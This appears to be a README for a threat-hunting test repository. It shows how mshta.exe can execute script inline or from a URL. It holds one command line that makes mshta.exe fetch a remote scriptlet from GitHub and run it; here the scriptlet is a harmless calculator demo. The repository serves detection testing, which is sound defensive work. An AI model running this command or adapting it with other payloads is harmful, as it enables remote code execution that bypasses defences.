# TestThreatHunting
Using mshta.exe to preform scripts inline or from a URL

Test the following:
* mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/0xMo/TestThreatHunting/main/PS1.sct')).Exec();close();
  - The will run a script from a URL to run calculator.
